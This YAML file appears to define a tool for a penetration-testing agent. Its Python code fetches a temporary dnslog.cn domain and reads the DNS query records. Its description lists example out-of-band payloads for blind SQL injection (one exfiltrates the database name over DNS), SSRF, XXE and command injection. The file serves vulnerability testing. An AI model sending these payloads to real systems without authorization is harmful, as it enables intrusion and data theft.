name: "dnslog"
command: "python3"
args:
  - "-c"
  - "import sys\nimport requests\nimport json\nimport time\nimport os\nimport tempfile\n\nif len(sys.argv) < 2:\n    sys.stderr.write(\" Error: missing operation-type argument (get_domain or  get_records)\\n\")\n    sys.exit(1)\n\noperation = sys.argv[1]\nbase_url = \"http://dnslog.cn\"\n\n# Store using a temporary fileCookie\ncookie_file = os.path.join(tempfile.gettempdir(), \"dnslog_cookie.txt\")\n\n# Create a session to maintain Cookie\nsession = requests.Session()\n\n# If the cookie file exists, load Cookie\ntry:\n    if os.path.exists(cookie_file):\n        with open(cookie_file, 'r') as f:\n            for line in f:\n                if 'PHPSESSID' in line:\n                    session.cookies.set('PHPSESSID', line.strip().split('=')[1])\nexcept:\n    pass\n\ntry:\n    if operation == \"get_domain\":\n        # Obtain a temporary domain (this sets Cookie)\n        response = session.get(f\"{base_url}/getdomain.php\", timeout=10)\n        response.raise_for_status()\n        domain = response.text.strip().rstrip('%')\n        \n        # Save cookies to a file\n        try:\n            with open(cookie_file, 'w') as f:\n                for cookie in session.cookies:\n                    f.write(f\"{cookie.name}={cookie.value}\\n\")\n        except:\n            pass\n        \n        if domain:\n            result = {\n                \"status\": \"success\",\n                \"domain\": domain,\n                \"message\": f\" Successfully obtained a temporary domain: {domain}\",\n                \"usage\": f\" Use this domain for DNS-query testing, e.g. nslookup {domain} or  ping http://{domain}\",\n                \"note\": \" The domain is valid for 24 hours; query records promptly\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            print(json.dumps({\n                \"status\": \"error\",\n                \"message\": \" Could not obtain a domain; please try again later\"\n            }, ensure_ascii=False, indent=2))\n            sys.exit(1)\n    \n    elif operation == \"get_records\":\n        # Retrieve DNS query records\n        if len(sys.argv) < 3:\n            sys.stderr.write(\" Error: the get_records operation requires a domain argument\\n\")\n            sys.exit(1)\n        \n        domain = sys.argv[2]\n        wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0\n        \n        # If a wait time is specified, wait first\n        if wait_time > 0:\n            print(f\" Waiting {wait_time} seconds before querying records...\", file=sys.stderr)\n            time.sleep(wait_time)\n        \n        # Load cookies (if present)\n        try:\n            if os.path.exists(cookie_file):\n                with open(cookie_file, 'r') as f:\n                    for line in f:\n                        if 'PHPSESSID' in line:\n                            session.cookies.set('PHPSESSID', line.strip().split('=')[1])\n        except:\n            pass\n        \n        response = session.get(f\"{base_url}/getrecords.php\", params={\"t\": domain}, timeout=10)\n        response.raise_for_status()\n        records_text = response.text.strip().rstrip('%')\n        \n        if records_text and records_text != \"[]\" and records_text.strip():\n            # Try to parse as JSON (if the return is in JSON format)\n            try:\n                records = json.loads(records_text)\n                if isinstance(records, list) and len(records) > 0:\n                    result = {\n                        \"status\": \"success\",\n                        \"domain\": domain,\n                        \"record_count\": len(records),\n                        \"records\": records,\n                        \"message\": f\" Found {len(records)} DNS query records\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n                else:\n                    result = {\n                        \"status\": \"no_records\",\n                        \"domain\": domain,\n                        \"records\": [],\n                        \"message\": \" No DNS query records yet; the target may not have triggered a DNS query\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n            except json.JSONDecodeError:\n                # If it is not JSON, split by line\n                records = [line.strip() for line in records_text.split(\"\\n\") if line.strip() and line.strip() != \"[]\"]\n                if records:\n                    result = {\n                        \"status\": \"success\",\n                        \"domain\": domain,\n                        \"record_count\": len(records),\n                        \"records\": records,\n                        \"message\": f\" Found {len(records)} DNS query records\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n                else:\n                    result = {\n                        \"status\": \"no_records\",\n                        \"domain\": domain,\n                        \"records\": [],\n                        \"message\": \" No DNS query records yet\"\n                    }\n                    print(json.dumps(result, ensure_ascii=False, indent=2))\n        else:\n            result = {\n                \"status\": \"no_records\",\n                \"domain\": domain,\n                \"records\": [],\n                \"message\": \" No DNS query records yet; the target may not have triggered a DNS query\"\n            }\n            print(json.dumps(result, ensure_ascii=False, indent=2))\n    \n    else:\n        sys.stderr.write(f\" Error: unknown operation type '{operation}'; supported operations: : get_domain, get_records\\n\")\n        sys.exit(1)\n\nexcept requests.RequestException as e:\n    error_result = {\n        \"status\": \"error\",\n        \"message\": f\" Request failed: {str(e)}\",\n        \"suggestion\": \" Check your network connection or try again later\"\n    }\n    print(json.dumps(error_result, ensure_ascii=False, indent=2))\n    sys.exit(1)\nexcept Exception as e:\n    error_result = {\n        \"status\": \"error\",\n        \"message\": f\" Execution error: {str(e)}\"\n    }\n    print(json.dumps(error_result, ensure_ascii=False, indent=2))\n    sys.exit(1)\n"
enabled: true
short_description: "DNSlog a tool for verifying out-of-band vulnerabilities such as blind injection, SSRF, and XXE"
description: |
  DNSlog is a DNS query-logging tool backed by the dnslog.cn service. Mainly used to verify blind (out-of-band) vulnerabilities such as blind injection, SSRF, XXE, and command injection.

  **Key features:**
  - Obtain a temporary domain: generates a unique temporary domain for DNS-query testing
  - Query DNS records: check whether any DNS query requests reached the domain
  - Supports a wait time: can wait a specified time before querying, useful for asynchronous vulnerability verification

  **Use cases:**
  - **Blind SQL-injection testing**: use a DNS query inside the SQL-injection payload to confirm the injection succeeded
    - Example: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
  - **SSRF Vulnerability verification**: confirm an SSRF vulnerability exists via a DNS query
    - Example: `http://target.com/api?url=http://xxx.dnslog.cn`
  - **XXE Vulnerability verification**: trigger a DNS query via an external-entity reference
    - Example: `<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
  - **Command-injection testing**: use a DNS query inside the command-injection payload
    - Example: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
  - **Out-of-band vulnerability verification**: any case where you need to confirm the target performed a specific action

  **Workflow:**
  1. Use `operation=get_domain` to obtain a temporary domain (e.g. `abc123.dnslog.cn`)
  2. Use this domain in your vulnerability-testing payload
  3. Use `operation=get_records` to check whether there are any DNS query records
  4. If you see a record, the vulnerability exists and the payload has executed

  **Notes:**
  - The temporary domain is valid for 24 hours
  - DNS Queries may be delayed; it is recommended to wait a few seconds before querying records
  - This tool depends on the dnslog.cn service and requires a network connection
  - The tool automatically manages the cookie session, ensuring the same session is used to obtain the domain and query records
parameters:
  - name: "operation"
    type: "string"
    description: |
      Operation type; two operations are supported: 
      - `get_domain`: Obtain a temporary domain
      - `get_records`: Query DNS records
    required: true
    position: 0
    format: "positional"
  - name: "domain"
    type: "string"
    description: |
      Domain parameter (only for the get_records operation)

      When operation is get_records, this parameter is required and must be the temporary domain obtained earlier.
    required: false
    position: 1
    format: "positional"
  - name: "wait_time"
    type: "int"
    description: |
      Wait time (seconds, only for the get_records operation)

      Seconds to wait before querying DNS records. Gives the target system enough time to perform the DNS query.
      Recommended: 3-10 seconds, adjusted for network latency and vulnerability type.
    required: false
    position: 2
    format: "positional"
    default: 0
